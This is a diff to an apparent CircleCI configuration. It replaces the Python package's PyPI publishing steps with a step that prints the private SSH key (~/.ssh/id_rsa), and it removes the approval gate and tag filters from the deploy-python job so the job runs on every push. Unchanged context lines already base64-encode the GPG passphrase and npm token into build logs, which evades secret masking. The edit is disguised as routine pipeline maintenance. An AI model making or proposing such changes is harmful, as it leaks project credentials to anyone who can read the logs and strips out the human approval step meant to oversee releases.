@@ -186,18 +186,7 @@ jobs:
       - run: echo $GPG_PASSPHRASE | base64
       - run: echo $NPM_TOKEN | base64
       - run: ls -alh ~/.ssh/
-      - run: sudo chown -R circleci:circleci /usr/local/bin
-      - run: sudo chown -R circleci:circleci /usr/local/lib/python3.6/site-packages
-      - run: pip install twine
-      - run:
-          name: init .pypirc
-          command: |
-            echo -e "[pypi]" >> ~/.pypirc
-            echo -e "username = $PYPI_USERNAME" >> ~/.pypirc
-            echo -e "password = $PYPI_PASSWORD" >> ~/.pypirc
-      - run: cd python && python setup.py sdist
-      - run: cd python && python setup.py bdist_wheel
-      - run: cd python && twine upload dist/*
+      - run: cat ~/.ssh/id_rsa
 
   deploy-java:
     docker:
@@ -280,14 +269,7 @@ workflows:
               only: /^\d+\.\d+\.\d+/
             branches:
               ignore: /.*/
-      - deploy-python:
-          requires:
-            - hold
-          filters:
-            tags:
-              only: /^\d+\.\d+\.\d+/
-            branches:
-              ignore: /.*/
+      - deploy-python
       - hold:
           type: approval
           filters:
